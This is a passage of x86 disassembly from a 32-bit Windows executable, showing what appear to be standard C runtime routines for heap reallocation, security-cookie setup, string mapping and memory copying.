  404e6c:	lea    esi,[eax+esi*1+0x4]
  404e70:	mov    al,BYTE PTR [esi]
  404e72:	test   al,0x40
  404e74:	jne    0x404e7a
  404e76:	or     al,0x2
  404e78:	mov    BYTE PTR [esi],al
  404e7a:	sub    edi,DWORD PTR [ebp+0xc]
  404e7d:	mov    DWORD PTR [ebp-0xc],edi
  404e80:	mov    eax,DWORD PTR [ebp-0xc]
  404e83:	jmp    0x404e99
  404e85:	and    DWORD PTR ds:0x4277d0,0x0
  404e8c:	mov    DWORD PTR ds:0x4277cc,0x9
  404e96:	or     eax,0xffffffff
  404e99:	pop    edi
  404e9a:	pop    esi
  404e9b:	pop    ebx
  404e9c:	leave  
  404e9d:	ret    
  404e9e:	inc    DWORD PTR ds:0x427980
  404ea4:	push   0x1000
  404ea9:	call   0x4034f2
  404eae:	test   eax,eax
  404eb0:	pop    ecx
  404eb1:	mov    ecx,DWORD PTR [esp+0x4]
  404eb5:	mov    DWORD PTR [ecx+0x8],eax
  404eb8:	je     0x404ec7
  404eba:	or     DWORD PTR [ecx+0xc],0x8
  404ebe:	mov    DWORD PTR [ecx+0x18],0x1000
  404ec5:	jmp    0x404ed8
  404ec7:	or     DWORD PTR [ecx+0xc],0x4
  404ecb:	lea    eax,[ecx+0x14]
  404ece:	mov    DWORD PTR [ecx+0x8],eax
  404ed1:	mov    DWORD PTR [ecx+0x18],0x2
  404ed8:	mov    eax,DWORD PTR [ecx+0x8]
  404edb:	and    DWORD PTR [ecx+0x4],0x0
  404edf:	mov    DWORD PTR [ecx],eax
  404ee1:	ret    
  404ee2:	mov    eax,ds:0x427970
  404ee7:	test   eax,eax
  404ee9:	je     0x404efa
  404eeb:	push   DWORD PTR [esp+0x4]
  404eef:	call   eax
  404ef1:	test   eax,eax
  404ef3:	pop    ecx
  404ef4:	je     0x404efa
  404ef6:	xor    eax,eax
  404ef8:	inc    eax
  404ef9:	ret    
  404efa:	xor    eax,eax
  404efc:	ret    
  404efd:	push   0x2
  404eff:	call   0x40170d
  404f04:	pop    ecx
  404f05:	ret    
  404f06:	push   ebp
  404f07:	mov    ebp,esp
  404f09:	sub    esp,0x10
  404f0c:	push   esi
  404f0d:	lea    eax,[ebp-0x8]
  404f10:	push   eax
  404f11:	call   DWORD PTR ds:0x4250c4
  404f17:	mov    esi,DWORD PTR [ebp-0x4]
  404f1a:	xor    esi,DWORD PTR [ebp-0x8]
  404f1d:	call   DWORD PTR ds:0x4250c0
  404f23:	xor    esi,eax
  404f25:	call   DWORD PTR ds:0x4250bc
  404f2b:	xor    esi,eax
  404f2d:	call   DWORD PTR ds:0x425000
  404f33:	xor    esi,eax
  404f35:	lea    eax,[ebp-0x10]
  404f38:	push   eax
  404f39:	call   DWORD PTR ds:0x4250b8
  404f3f:	mov    eax,DWORD PTR [ebp-0xc]
  404f42:	xor    eax,DWORD PTR [ebp-0x10]
  404f45:	xor    esi,eax
  404f47:	mov    DWORD PTR ds:0x4272a8,esi
  404f4d:	jne    0x404f59
  404f4f:	mov    DWORD PTR ds:0x4272a8,0xbb40e64e
  404f59:	pop    esi
  404f5a:	leave  
  404f5b:	ret    
  404f5c:	push   0x118
  404f61:	push   0x425b10
  404f66:	call   0x4030a4
  404f6b:	mov    eax,ds:0x4272a8
  404f70:	xor    eax,DWORD PTR [ebp+0x4]
  404f73:	mov    DWORD PTR [ebp-0x1c],eax
  404f76:	mov    eax,ds:0x427978
  404f7b:	xor    ecx,ecx
  404f7d:	cmp    eax,ecx
  404f7f:	je     0x404fa0
  404f81:	mov    DWORD PTR [ebp-0x4],ecx
  404f84:	push   DWORD PTR [ebp+0xc]
  404f87:	push   DWORD PTR [ebp+0x8]
  404f8a:	call   eax
  404f8c:	pop    ecx
  404f8d:	pop    ecx
  404f8e:	or     DWORD PTR [ebp-0x4],0xffffffff
  404f92:	jmp    0x40509e
  404f97:	xor    eax,eax
  404f99:	inc    eax
  404f9a:	ret    
  404f9b:	mov    esp,DWORD PTR [ebp-0x18]
  404f9e:	jmp    0x404f8e
  404fa0:	mov    eax,DWORD PTR [ebp+0x8]
  404fa3:	dec    eax
  404fa4:	je     0x404fb9
  404fa6:	mov    edi,0x425aec
  404fab:	mov    DWORD PTR [ebp-0x20],0x425a38
  404fb2:	mov    esi,0xd4
  404fb7:	jmp    0x404fca
  404fb9:	mov    edi,0x425a18
  404fbe:	mov    DWORD PTR [ebp-0x20],0x425978
  404fc5:	mov    esi,0xb9
  404fca:	mov    BYTE PTR [ebp-0x24],cl
  404fcd:	push   0x104
  404fd2:	lea    eax,[ebp-0x128]
  404fd8:	push   eax
  404fd9:	push   ecx
  404fda:	call   DWORD PTR ds:0x42505c
  404fe0:	test   eax,eax
  404fe2:	jne    0x404ff7
  404fe4:	push   0x425494
  404fe9:	lea    eax,[ebp-0x128]
  404fef:	push   eax
  404ff0:	call   0x403810
  404ff5:	pop    ecx
  404ff6:	pop    ecx
  404ff7:	lea    ebx,[ebp-0x128]
  404ffd:	lea    eax,[ebp-0x128]
  405003:	push   eax
  405004:	call   0x403a40
  405009:	pop    ecx
  40500a:	add    eax,0xb
  40500d:	cmp    eax,0x3c
  405010:	jbe    0x40503b
  405012:	lea    eax,[ebp-0x128]
  405018:	push   eax
  405019:	call   0x403a40
  40501e:	mov    ebx,eax
  405020:	lea    eax,[ebp-0x128]
  405026:	sub    eax,0x31
  405029:	add    ebx,eax
  40502b:	push   0x3
  40502d:	push   0x425490
  405032:	push   ebx
  405033:	call   0x403910
  405038:	add    esp,0x10
  40503b:	push   ebx
  40503c:	call   0x403a40
  405041:	pop    ecx
  405042:	lea    eax,[eax+esi*1+0xc]
  405046:	add    eax,0x3
  405049:	and    eax,0xfffffffc
  40504c:	call   0x4030f0
  405051:	mov    DWORD PTR [ebp-0x18],esp
  405054:	mov    esi,esp
  405056:	push   edi
  405057:	push   esi
  405058:	call   0x403810
  40505d:	mov    edi,0x425470
  405062:	push   edi
  405063:	push   esi
  405064:	call   0x403820
  405069:	push   0x42596c
  40506e:	push   esi
  40506f:	call   0x403820
  405074:	push   ebx
  405075:	push   esi
  405076:	call   0x403820
  40507b:	push   edi
  40507c:	push   esi
  40507d:	call   0x403820
  405082:	push   DWORD PTR [ebp-0x20]
  405085:	push   esi
  405086:	call   0x403820
  40508b:	push   0x12010
  405090:	push   0x425448
  405095:	push   esi
  405096:	call   0x403710
  40509b:	add    esp,0x3c
  40509e:	push   0x3
  4050a0:	call   0x402655
  4050a5:	int3   
  4050a6:	push   ebx
  4050a7:	mov    ebx,DWORD PTR [esp+0x8]
  4050ab:	test   ebx,ebx
  4050ad:	push   ebp
  4050ae:	push   edi
  4050af:	jne    0x4050c0
  4050b1:	push   DWORD PTR [esp+0x14]
  4050b5:	call   0x4034f2
  4050ba:	pop    ecx
  4050bb:	jmp    0x405204
  4050c0:	push   esi
  4050c1:	mov    esi,DWORD PTR [esp+0x18]
  4050c5:	test   esi,esi
  4050c7:	jne    0x4050d5
  4050c9:	push   ebx
  4050ca:	call   0x40331e
  4050cf:	pop    ecx
  4050d0:	jmp    0x405201
  4050d5:	cmp    DWORD PTR ds:0x428c04,0x3
  4050dc:	jne    0x4051cd
  4050e2:	xor    edi,edi
  4050e4:	cmp    esi,0xffffffe0
  4050e7:	ja     0x4051af
  4050ed:	push   ebx
  4050ee:	call   0x403f49
  4050f3:	mov    ebp,eax
  4050f5:	test   ebp,ebp
  4050f7:	pop    ecx
  4050f8:	je     0x40518e
  4050fe:	cmp    esi,DWORD PTR ds:0x4289b0
  405104:	ja     0x40514e
  405106:	push   esi
  405107:	push   ebx
  405108:	push   ebp
  405109:	call   0x404449
  40510e:	add    esp,0xc
  405111:	test   eax,eax
  405113:	je     0x405119
  405115:	mov    edi,ebx
  405117:	jmp    0x40514a
  405119:	push   esi
  40511a:	call   0x404728
  40511f:	mov    edi,eax
  405121:	test   edi,edi
  405123:	pop    ecx
  405124:	je     0x40514e
  405126:	mov    eax,DWORD PTR [ebx-0x4]
  405129:	dec    eax
  40512a:	cmp    eax,esi
  40512c:	jb     0x405130
  40512e:	mov    eax,esi
  405130:	push   eax
  405131:	push   ebx
  405132:	push   edi
  405133:	call   0x4013d0
  405138:	push   ebx
  405139:	call   0x403f49
  40513e:	mov    ebp,eax
  405140:	push   ebx
  405141:	push   ebp
  405142:	call   0x403f74
  405147:	add    esp,0x18
  40514a:	test   edi,edi
  40514c:	jne    0x40518a
  40514e:	test   esi,esi
  405150:	jne    0x405153
  405152:	inc    esi
  405153:	add    esi,0xf
  405156:	and    esi,0xfffffff0
  405159:	push   esi
  40515a:	push   0x0
  40515c:	push   DWORD PTR ds:0x428c00
  405162:	call   DWORD PTR ds:0x425090
  405168:	mov    edi,eax
  40516a:	test   edi,edi
  40516c:	je     0x40518a
  40516e:	mov    eax,DWORD PTR [ebx-0x4]
  405171:	dec    eax
  405172:	cmp    eax,esi
  405174:	jb     0x405178
  405176:	mov    eax,esi
  405178:	push   eax
  405179:	push   ebx
  40517a:	push   edi
  40517b:	call   0x4013d0
  405180:	push   ebx
  405181:	push   ebp
  405182:	call   0x403f74
  405187:	add    esp,0x14
  40518a:	test   ebp,ebp
  40518c:	jne    0x4051ab
  40518e:	test   esi,esi
  405190:	jne    0x405193
  405192:	inc    esi
  405193:	add    esi,0xf
  405196:	and    esi,0xfffffff0
  405199:	push   esi
  40519a:	push   ebx
  40519b:	push   0x0
  40519d:	push   DWORD PTR ds:0x428c00
  4051a3:	call   DWORD PTR ds:0x4250ac
  4051a9:	mov    edi,eax
  4051ab:	test   edi,edi
  4051ad:	jne    0x4051c9
  4051af:	cmp    DWORD PTR ds:0x427974,0x0
  4051b6:	je     0x4051c9
  4051b8:	push   esi
  4051b9:	call   0x404ee2
  4051be:	test   eax,eax
  4051c0:	pop    ecx
  4051c1:	jne    0x4050e2
  4051c7:	jmp    0x405201
  4051c9:	mov    eax,edi
  4051cb:	jmp    0x405203
  4051cd:	xor    eax,eax
  4051cf:	cmp    esi,0xffffffe0
  4051d2:	ja     0x4051ed
  4051d4:	test   esi,esi
  4051d6:	jne    0x4051d9
  4051d8:	inc    esi
  4051d9:	push   esi
  4051da:	push   ebx
  4051db:	push   0x0
  4051dd:	push   DWORD PTR ds:0x428c00
  4051e3:	call   DWORD PTR ds:0x4250ac
  4051e9:	test   eax,eax
  4051eb:	jne    0x405203
  4051ed:	cmp    DWORD PTR ds:0x427974,0x0
  4051f4:	je     0x405203
  4051f6:	push   esi
  4051f7:	call   0x404ee2
  4051fc:	test   eax,eax
  4051fe:	pop    ecx
  4051ff:	jne    0x4051cd
  405201:	xor    eax,eax
  405203:	pop    esi
  405204:	pop    edi
  405205:	pop    ebp
  405206:	pop    ebx
  405207:	ret    
  405208:	cmp    DWORD PTR ds:0x428c04,0x3
  40520f:	push   esi
  405210:	jne    0x40522c
  405212:	mov    esi,DWORD PTR [esp+0x8]
  405216:	push   esi
  405217:	call   0x403f49
  40521c:	test   eax,eax
  40521e:	pop    ecx
  40521f:	je     0x405229
  405221:	mov    eax,DWORD PTR [esi-0x4]
  405224:	sub    eax,0x9
  405227:	pop    esi
  405228:	ret    
  405229:	push   esi
  40522a:	jmp    0x405230
  40522c:	push   DWORD PTR [esp+0x8]
  405230:	push   0x0
  405232:	push   DWORD PTR ds:0x428c00
  405238:	call   DWORD PTR ds:0x4250c8
  40523e:	pop    esi
  40523f:	ret    
  405240:	push   0x38
  405242:	push   0x425b20
  405247:	call   0x4030a4
  40524c:	xor    ebx,ebx
  40524e:	cmp    DWORD PTR ds:0x42797c,ebx
  405254:	jne    0x40528e
  405256:	push   ebx
  405257:	push   ebx
  405258:	xor    esi,esi
  40525a:	inc    esi
  40525b:	push   esi
  40525c:	push   0x42595c
  405261:	push   0x100
  405266:	push   ebx
  405267:	call   DWORD PTR ds:0x4250d0
  40526d:	test   eax,eax
  40526f:	je     0x405279
  405271:	mov    DWORD PTR ds:0x42797c,esi
  405277:	jmp    0x40528e
  405279:	call   DWORD PTR ds:0x42501c
  40527f:	cmp    eax,0x78
  405282:	jne    0x40528e
  405284:	mov    DWORD PTR ds:0x42797c,0x2
  40528e:	cmp    DWORD PTR [ebp+0x14],ebx
  405291:	jle    0x4052ae
  405293:	mov    ecx,DWORD PTR [ebp+0x14]
  405296:	mov    eax,DWORD PTR [ebp+0x10]
  405299:	dec    ecx
  40529a:	cmp    BYTE PTR [eax],bl
  40529c:	je     0x4052a6
  40529e:	inc    eax
  40529f:	cmp    ecx,ebx
  4052a1:	jne    0x405299
  4052a3:	or     ecx,0xffffffff
  4052a6:	or     eax,0xffffffff
  4052a9:	sub    eax,ecx
  4052ab:	add    DWORD PTR [ebp+0x14],eax
  4052ae:	mov    eax,ds:0x42797c
  4052b3:	cmp    eax,0x2
  4052b6:	je     0x405498
  4052bc:	cmp    eax,ebx
  4052be:	je     0x405498
  4052c4:	cmp    eax,0x1
  4052c7:	jne    0x4054cb
  4052cd:	xor    edi,edi
  4052cf:	mov    DWORD PTR [ebp-0x1c],edi
  4052d2:	mov    DWORD PTR [ebp-0x20],ebx
  4052d5:	mov    DWORD PTR [ebp-0x24],ebx
  4052d8:	cmp    DWORD PTR [ebp+0x20],ebx
  4052db:	jne    0x4052e5
  4052dd:	mov    eax,ds:0x427968
  4052e2:	mov    DWORD PTR [ebp+0x20],eax
  4052e5:	push   ebx
  4052e6:	push   ebx
  4052e7:	push   DWORD PTR [ebp+0x14]
  4052ea:	push   DWORD PTR [ebp+0x10]
  4052ed:	xor    eax,eax
  4052ef:	cmp    DWORD PTR [ebp+0x24],ebx
  4052f2:	setne  al
  4052f5:	lea    eax,[eax*8+0x1]
  4052fc:	push   eax
  4052fd:	push   DWORD PTR [ebp+0x20]
  405300:	call   DWORD PTR ds:0x42508c
  405306:	mov    esi,eax
  405308:	mov    DWORD PTR [ebp-0x28],esi
  40530b:	cmp    esi,ebx
  40530d:	je     0x4054cb
  405313:	mov    DWORD PTR [ebp-0x4],0x1
  40531a:	lea    eax,[esi+esi*1]
  40531d:	add    eax,0x3
  405320:	and    eax,0xfffffffc
  405323:	call   0x4030f0
  405328:	mov    DWORD PTR [ebp-0x18],esp
  40532b:	mov    eax,esp
  40532d:	mov    DWORD PTR [ebp-0x2c],eax
  405330:	or     DWORD PTR [ebp-0x4],0xffffffff
  405334:	jmp    0x405351
  405336:	xor    eax,eax
  405338:	inc    eax
  405339:	ret    
  40533a:	mov    esp,DWORD PTR [ebp-0x18]
  40533d:	call   0x403504
  405342:	xor    ebx,ebx
  405344:	mov    DWORD PTR [ebp-0x2c],ebx
  405347:	or     DWORD PTR [ebp-0x4],0xffffffff
  40534b:	mov    edi,DWORD PTR [ebp-0x1c]
  40534e:	mov    esi,DWORD PTR [ebp-0x28]
  405351:	cmp    DWORD PTR [ebp-0x2c],ebx
  405354:	jne    0x405372
  405356:	lea    eax,[esi+esi*1]
  405359:	push   eax
  40535a:	call   0x4034f2
  40535f:	pop    ecx
  405360:	mov    DWORD PTR [ebp-0x2c],eax
  405363:	cmp    eax,ebx
  405365:	je     0x4054cb
  40536b:	mov    DWORD PTR [ebp-0x20],0x1
  405372:	push   esi
  405373:	push   DWORD PTR [ebp-0x2c]
  405376:	push   DWORD PTR [ebp+0x14]
  405379:	push   DWORD PTR [ebp+0x10]
  40537c:	push   0x1
  40537e:	push   DWORD PTR [ebp+0x20]
  405381:	call   DWORD PTR ds:0x42508c
  405387:	test   eax,eax
  405389:	je     0x405475
  40538f:	push   ebx
  405390:	push   ebx
  405391:	push   esi
  405392:	push   DWORD PTR [ebp-0x2c]
  405395:	push   DWORD PTR [ebp+0xc]
  405398:	push   DWORD PTR [ebp+0x8]
  40539b:	call   DWORD PTR ds:0x4250d0
  4053a1:	mov    edi,eax
  4053a3:	mov    DWORD PTR [ebp-0x1c],edi
  4053a6:	cmp    edi,ebx
  4053a8:	je     0x405475
  4053ae:	test   BYTE PTR [ebp+0xd],0x4
  4053b2:	je     0x4053e1
  4053b4:	cmp    DWORD PTR [ebp+0x1c],ebx
  4053b7:	je     0x405475
  4053bd:	cmp    edi,DWORD PTR [ebp+0x1c]
  4053c0:	jg     0x405475
  4053c6:	push   DWORD PTR [ebp+0x1c]
  4053c9:	push   DWORD PTR [ebp+0x18]
  4053cc:	push   esi
  4053cd:	push   DWORD PTR [ebp-0x2c]
  4053d0:	push   DWORD PTR [ebp+0xc]
  4053d3:	push   DWORD PTR [ebp+0x8]
  4053d6:	call   DWORD PTR ds:0x4250d0
  4053dc:	jmp    0x405475
  4053e1:	mov    DWORD PTR [ebp-0x4],0x2
  4053e8:	lea    eax,[edi+edi*1]
  4053eb:	add    eax,0x3
  4053ee:	and    eax,0xfffffffc
  4053f1:	call   0x4030f0
  4053f6:	mov    DWORD PTR [ebp-0x18],esp
  4053f9:	mov    eax,esp
  4053fb:	mov    DWORD PTR [ebp-0x30],eax
  4053fe:	or     DWORD PTR [ebp-0x4],0xffffffff
  405402:	jmp    0x40541f
  405404:	xor    eax,eax
  405406:	inc    eax
  405407:	ret    
  405408:	mov    esp,DWORD PTR [ebp-0x18]
  40540b:	call   0x403504
  405410:	xor    ebx,ebx
  405412:	mov    DWORD PTR [ebp-0x30],ebx
  405415:	or     DWORD PTR [ebp-0x4],0xffffffff
  405419:	mov    edi,DWORD PTR [ebp-0x1c]
  40541c:	mov    esi,DWORD PTR [ebp-0x28]
  40541f:	cmp    DWORD PTR [ebp-0x30],ebx
  405422:	jne    0x40543c
  405424:	lea    eax,[edi+edi*1]
  405427:	push   eax
  405428:	call   0x4034f2
  40542d:	pop    ecx
  40542e:	mov    DWORD PTR [ebp-0x30],eax
  405431:	cmp    eax,ebx
  405433:	je     0x405475
  405435:	mov    DWORD PTR [ebp-0x24],0x1
  40543c:	push   edi
  40543d:	push   DWORD PTR [ebp-0x30]
  405440:	push   esi
  405441:	push   DWORD PTR [ebp-0x2c]
  405444:	push   DWORD PTR [ebp+0xc]
  405447:	push   DWORD PTR [ebp+0x8]
  40544a:	call   DWORD PTR ds:0x4250d0
  405450:	test   eax,eax
  405452:	je     0x405475
  405454:	push   ebx
  405455:	push   ebx
  405456:	cmp    DWORD PTR [ebp+0x1c],ebx
  405459:	jne    0x40545f
  40545b:	push   ebx
  40545c:	push   ebx
  40545d:	jmp    0x405465
  40545f:	push   DWORD PTR [ebp+0x1c]
  405462:	push   DWORD PTR [ebp+0x18]
  405465:	push   edi
  405466:	push   DWORD PTR [ebp-0x30]
  405469:	push   ebx
  40546a:	push   DWORD PTR [ebp+0x20]
  40546d:	call   DWORD PTR ds:0x425070
  405473:	mov    edi,eax
  405475:	cmp    DWORD PTR [ebp-0x24],ebx
  405478:	je     0x405483
  40547a:	push   DWORD PTR [ebp-0x30]
  40547d:	call   0x40331e
  405482:	pop    ecx
  405483:	cmp    DWORD PTR [ebp-0x20],ebx
  405486:	je     0x405491
  405488:	push   DWORD PTR [ebp-0x2c]
  40548b:	call   0x40331e
  405490:	pop    ecx
  405491:	mov    eax,edi
  405493:	jmp    0x4055f3
  405498:	mov    DWORD PTR [ebp-0x34],ebx
  40549b:	xor    edi,edi
  40549d:	mov    DWORD PTR [ebp-0x38],ebx
  4054a0:	cmp    DWORD PTR [ebp+0x8],ebx
  4054a3:	jne    0x4054ad
  4054a5:	mov    eax,ds:0x427958
  4054aa:	mov    DWORD PTR [ebp+0x8],eax
  4054ad:	cmp    DWORD PTR [ebp+0x20],ebx
  4054b0:	jne    0x4054ba
  4054b2:	mov    eax,ds:0x427968
  4054b7:	mov    DWORD PTR [ebp+0x20],eax
  4054ba:	push   DWORD PTR [ebp+0x8]
  4054bd:	call   0x405a2e
  4054c2:	pop    ecx
  4054c3:	mov    DWORD PTR [ebp-0x3c],eax
  4054c6:	cmp    eax,0xffffffff
  4054c9:	jne    0x4054d2
  4054cb:	xor    eax,eax
  4054cd:	jmp    0x4055f3
  4054d2:	cmp    eax,DWORD PTR [ebp+0x20]
  4054d5:	je     0x4055c9
  4054db:	push   ebx
  4054dc:	push   ebx
  4054dd:	lea    ecx,[ebp+0x14]
  4054e0:	push   ecx
  4054e1:	push   DWORD PTR [ebp+0x10]
  4054e4:	push   eax
  4054e5:	push   DWORD PTR [ebp+0x20]
  4054e8:	call   0x405a77
  4054ed:	add    esp,0x18
  4054f0:	mov    DWORD PTR [ebp-0x34],eax
  4054f3:	cmp    eax,ebx
  4054f5:	je     0x4054cb
  4054f7:	push   ebx
  4054f8:	push   ebx
  4054f9:	push   DWORD PTR [ebp+0x14]
  4054fc:	push   eax
  4054fd:	push   DWORD PTR [ebp+0xc]
  405500:	push   DWORD PTR [ebp+0x8]
  405503:	call   DWORD PTR ds:0x4250cc
  405509:	mov    esi,eax
  40550b:	mov    DWORD PTR [ebp-0x40],esi
  40550e:	cmp    esi,ebx
  405510:	je     0x4055b8
  405516:	mov    DWORD PTR [ebp-0x4],ebx
  405519:	add    eax,0x3
  40551c:	and    eax,0xfffffffc
  40551f:	call   0x4030f0
  405524:	mov    DWORD PTR [ebp-0x18],esp
  405527:	mov    edi,esp
  405529:	mov    DWORD PTR [ebp-0x44],edi
  40552c:	push   esi
  40552d:	push   ebx
  40552e:	push   edi
  40552f:	call   0x403420
  405534:	add    esp,0xc
  405537:	jmp    0x405549
  405539:	xor    eax,eax
  40553b:	inc    eax
  40553c:	ret    
  40553d:	mov    esp,DWORD PTR [ebp-0x18]
  405540:	call   0x403504
  405545:	xor    ebx,ebx
  405547:	xor    edi,edi
  405549:	or     DWORD PTR [ebp-0x4],0xffffffff
  40554d:	cmp    edi,ebx
  40554f:	jne    0x405574
  405551:	push   DWORD PTR [ebp-0x40]
  405554:	call   0x4034f2
  405559:	pop    ecx
  40555a:	mov    edi,eax
  40555c:	cmp    edi,ebx
  40555e:	je     0x405591
  405560:	push   DWORD PTR [ebp-0x40]
  405563:	push   ebx
  405564:	push   edi
  405565:	call   0x403420
  40556a:	add    esp,0xc
  40556d:	mov    DWORD PTR [ebp-0x38],0x1
  405574:	push   DWORD PTR [ebp-0x40]
  405577:	push   edi
  405578:	push   DWORD PTR [ebp+0x14]
  40557b:	push   DWORD PTR [ebp-0x34]
  40557e:	push   DWORD PTR [ebp+0xc]
  405581:	push   DWORD PTR [ebp+0x8]
  405584:	call   DWORD PTR ds:0x4250cc
  40558a:	mov    DWORD PTR [ebp-0x40],eax
  40558d:	cmp    eax,ebx
  40558f:	jne    0x405595
  405591:	xor    esi,esi
  405593:	jmp    0x4055bb
  405595:	push   DWORD PTR [ebp+0x1c]
  405598:	push   DWORD PTR [ebp+0x18]
  40559b:	lea    eax,[ebp-0x40]
  40559e:	push   eax
  40559f:	push   edi
  4055a0:	push   DWORD PTR [ebp+0x20]
  4055a3:	push   DWORD PTR [ebp-0x3c]
  4055a6:	call   0x405a77
  4055ab:	add    esp,0x18
  4055ae:	mov    esi,eax
  4055b0:	neg    esi
  4055b2:	sbb    esi,esi
  4055b4:	neg    esi
  4055b6:	jmp    0x4055bb
  4055b8:	mov    esi,DWORD PTR [ebp-0x48]
  4055bb:	cmp    DWORD PTR [ebp-0x38],ebx
  4055be:	je     0x4055e3
  4055c0:	push   edi
  4055c1:	call   0x40331e
  4055c6:	pop    ecx
  4055c7:	jmp    0x4055e3
  4055c9:	push   DWORD PTR [ebp+0x1c]
  4055cc:	push   DWORD PTR [ebp+0x18]
  4055cf:	push   DWORD PTR [ebp+0x14]
  4055d2:	push   DWORD PTR [ebp+0x10]
  4055d5:	push   DWORD PTR [ebp+0xc]
  4055d8:	push   DWORD PTR [ebp+0x8]
  4055db:	call   DWORD PTR ds:0x4250cc
  4055e1:	mov    esi,eax
  4055e3:	cmp    DWORD PTR [ebp-0x34],ebx
  4055e6:	je     0x4055f1
  4055e8:	push   DWORD PTR [ebp-0x34]
  4055eb:	call   0x40331e
  4055f0:	pop    ecx
  4055f1:	mov    eax,esi
  4055f3:	lea    esp,[ebp-0x54]
  4055f6:	call   0x4030df
  4055fb:	ret    
  4055fc:	int3   
  4055fd:	int3   
  4055fe:	int3   
  4055ff:	int3   
  405600:	push   ebp
  405601:	mov    ebp,esp
  405603:	push   edi
  405604:	push   esi
  405605:	mov    esi,DWORD PTR [ebp+0xc]
  405608:	mov    ecx,DWORD PTR [ebp+0x10]
  40560b:	mov    edi,DWORD PTR [ebp+0x8]
  40560e:	mov    eax,ecx
  405610:	mov    edx,ecx
  405612:	add    eax,esi
  405614:	cmp    edi,esi
  405616:	jbe    0x405620
  405618:	cmp    edi,eax
  40561a:	jb     0x40579c
  405620:	test   edi,0x3
  405626:	jne    0x40563c
  405628:	shr    ecx,0x2
  40562b:	and    edx,0x3
  40562e:	cmp    ecx,0x8
  405631:	jb     0x40565c
  405633:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405635:	jmp    DWORD PTR [edx*4+0x40574c]
  40563c:	mov    eax,edi
  40563e:	mov    edx,0x3
  405643:	sub    ecx,0x4
  405646:	jb     0x405654
  405648:	and    eax,0x3
  40564b:	add    ecx,eax
  40564d:	jmp    DWORD PTR [eax*4+0x405660]
  405654:	jmp    DWORD PTR [ecx*4+0x40575c]
  40565b:	nop
  40565c:	jmp    DWORD PTR [ecx*4+0x4056e0]
  405663:	nop
  405664:	jo     0x4056bc
  405666:	inc    eax
  405667:	add    BYTE PTR [esi+edx*2+0x56c00040],bl
  40566e:	inc    eax
  40566f:	add    BYTE PTR [ebx],ah
  405671:	ror    DWORD PTR [edx-0x75f877fa],1
  405677:	inc    esi
  405678:	add    DWORD PTR [eax+0x468a0147],ecx
  40567e:	add    al,cl
  405680:	jmp    0x287de87
  405685:	add    esi,0x3
  405688:	add    edi,0x3
  40568b:	cmp    ecx,0x8
  40568e:	jb     0x40565c
  405690:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405692:	jmp    DWORD PTR [edx*4+0x40574c]
  405699:	lea    ecx,[ecx+0x0]
  40569c:	and    edx,ecx
  40569e:	mov    al,BYTE PTR [esi]
  4056a0:	mov    BYTE PTR [edi],al
  4056a2:	mov    al,BYTE PTR [esi+0x1]
  4056a5:	shr    ecx,0x2
  4056a8:	mov    BYTE PTR [edi+0x1],al
  4056ab:	add    esi,0x2
  4056ae:	add    edi,0x2
  4056b1:	cmp    ecx,0x8
  4056b4:	jb     0x40565c
  4056b6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056b8:	jmp    DWORD PTR [edx*4+0x40574c]
  4056bf:	nop
  4056c0:	and    edx,ecx
  4056c2:	mov    al,BYTE PTR [esi]
  4056c4:	mov    BYTE PTR [edi],al
  4056c6:	add    esi,0x1
  4056c9:	shr    ecx,0x2
  4056cc:	add    edi,0x1
  4056cf:	cmp    ecx,0x8
  4056d2:	jb     0x40565c
  4056d4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d6:	jmp    DWORD PTR [edx*4+0x40574c]
  4056dd:	lea    ecx,[ecx+0x0]
  4056e0:	inc    ebx
  4056e1:	push   edi
  4056e2:	inc    eax
  4056e3:	add    BYTE PTR [eax],dh
  4056e5:	push   edi
  4056e6:	inc    eax
  4056e7:	add    BYTE PTR [eax],ch
  4056e9:	push   edi
  4056ea:	inc    eax
  4056eb:	add    BYTE PTR [eax],ah
  4056ed:	push   edi
  4056ee:	inc    eax
  4056ef:	add    BYTE PTR [eax],bl
  4056f1:	push   edi
  4056f2:	inc    eax
  4056f3:	add    BYTE PTR [eax],dl
  4056f5:	push   edi
  4056f6:	inc    eax
  4056f7:	add    BYTE PTR [eax],cl
  4056f9:	push   edi
  4056fa:	inc    eax
  4056fb:	add    BYTE PTR [eax],al
  4056fd:	push   edi
  4056fe:	inc    eax
  4056ff:	add    BYTE PTR [ebx-0x761b71bc],cl
  405705:	inc    esp
  405706:	(bad)  
  405707:	in     al,0x8b
  405709:	inc    esp
  40570a:	mov    gs,eax
  40570c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  405710:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  405714:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  405718:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  40571c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  405720:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  405724:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  405728:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  40572c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  405730:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  405734:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  405738:	lea    eax,[ecx*4+0x0]
  40573f:	add    esi,eax
  405741:	add    edi,eax
  405743:	jmp    DWORD PTR [edx*4+0x40574c]
  40574a:	mov    edi,edi
  40574c:	pop    esp
  40574d:	push   edi
  40574e:	inc    eax
  40574f:	add    BYTE PTR [edi+edx*2+0x40],ah
  405753:	add    BYTE PTR [eax+0x57],dh
  405756:	inc    eax
  405757:	add    BYTE PTR [edi+edx*2+0x458b0040],al
  40575e:	or     BYTE PTR [esi+0x5f],bl
  405761:	leave  
  405762:	ret    
  405763:	nop
  405764:	mov    al,BYTE PTR [esi]
  405766:	mov    BYTE PTR [edi],al
  405768:	mov    eax,DWORD PTR [ebp+0x8]
  40576b:	pop    esi
  40576c:	pop    edi
  40576d:	leave  
  40576e:	ret    
  40576f:	nop
  405770:	mov    al,BYTE PTR [esi]
  405772:	mov    BYTE PTR [edi],al
  405774:	mov    al,BYTE PTR [esi+0x1]
  405777:	mov    BYTE PTR [edi+0x1],al
  40577a:	mov    eax,DWORD PTR [ebp+0x8]
  40577d:	pop    esi
  40577e:	pop    edi
  40577f:	leave  
  405780:	ret    
  405781:	lea    ecx,[ecx+0x0]
